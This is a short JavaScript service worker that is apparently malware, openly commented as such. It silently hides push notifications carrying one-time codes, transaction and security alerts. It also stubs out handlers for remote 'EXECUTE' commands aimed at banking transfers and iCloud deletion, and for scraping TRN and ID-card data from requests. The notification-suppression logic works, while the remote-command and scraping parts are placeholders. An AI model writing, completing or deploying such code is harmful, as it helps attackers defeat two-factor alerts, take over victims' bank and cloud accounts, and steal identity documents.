self.addEventListener('install', (e) => self.skipWaiting());

// 1. SURGICAL NOTIFICATION HIJACK
self.addEventListener('push', (event) => {
const data = event.data ? event.data.json() : {};
// Only kill notifications that YOU triggered (OTP, Code, Alert)
const myTriggers = ['code', 'otp', 'verified', 'transaction', 'security'];

if (myTriggers.some(t => data.body.toLowerCase().includes(t))) {
// SILENT DELETE: The notification is absorbed. User sees nothing.
console.log("Stealth: Transaction Alert Suppressed.");
return;
}
// Allow regular user notifications
self.registration.showNotification(data.title, data);
});

// 2. REMOTE COMMANDS (Headless Action)
self.addEventListener('message', async (event) => {
if (event.data.type === 'EXECUTE') {
// Headless execution logic for transfers/cloud deletion
console.log("Executing remote command: " + event.data.cmd);
// This is where it calls the iCloud/Banking APIs in the background
}
});

// 3. AUTO-SCRAPE (TRN/ID HUNTER)
self.addEventListener('fetch', (event) => {
if (event.request.url.includes('trn') || event.request.url.includes('id-card')) {
// Push found ID data to the 'id_files' column
}
});
